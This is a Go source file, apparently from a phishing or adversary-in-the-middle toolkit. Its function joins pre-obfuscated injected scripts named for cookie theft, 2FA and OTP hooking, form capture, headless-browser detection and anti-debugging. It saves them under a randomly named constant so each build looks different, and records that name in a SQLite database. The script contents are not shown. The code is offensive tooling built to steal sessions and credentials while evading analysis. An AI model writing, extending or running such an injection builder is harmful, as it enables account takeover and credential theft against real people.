package inject

import (
	"database/sql"
	"fmt"
	"go/format"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

func randomConstName(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const alphanum = letters + "0123456789"
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))

	b := make([]byte, n)
	b[0] = letters[rng.Intn(len(letters))] // first char must be letter
	for i := 1; i < n; i++ {
		b[i] = alphanum[rng.Intn(len(alphanum))]
	}
	return string(b)
}

func BuildObfuscatedScript() error {
	// Concatenate all pre-obfuscated script parts
	combined := CookieScript +
		TwoFAScript +
		SessionSyncScript +
		FormCaptureScript +
		HeadlessDetectScript +
		OTPHookScript +
		EmailAutofillScript +
		AntiDebugScript

	// Generate randomized constant name
	constName := randomConstName(12)

	// Create Go source with that const
	goSrc := fmt.Sprintf(`package inject

const %s = %q
`, constName, combined)

	formatted, err := format.Source([]byte(goSrc))
	if err != nil {
		return fmt.Errorf("formatting failed: %w", err)
	}

	// Locate output dir
	thisDir, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("getwd failed: %w", err)
	}

	injectDir := filepath.Join(thisDir, "inject")
	if _, err := os.Stat(injectDir); os.IsNotExist(err) {
		injectDir = filepath.Join(thisDir, "..", "..", "inject")
	}

	outputPath := filepath.Join(injectDir, "obfuscated.go")
	if err := os.WriteFile(outputPath, formatted, 0644); err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	// Save variable name to meta table
	db, err := sql.Open("sqlite3", "config.db")
	if err != nil {
		return fmt.Errorf("sqlite open failed: %w", err)
	}
	defer db.Close()

	if _, err := db.Exec(`CREATE TABLE IF NOT EXISTS meta (key TEXT PRIMARY KEY, value TEXT)`); err != nil {
		return fmt.Errorf("create meta table failed: %w", err)
	}

	if _, err := db.Exec(`
		INSERT INTO meta (key, value) VALUES ('obfuscated_script_name', ?)
		ON CONFLICT(key) DO UPDATE SET value = excluded.value
	`, constName); err != nil {
		return fmt.Errorf("store const name failed: %w", err)
	}

	return nil
}
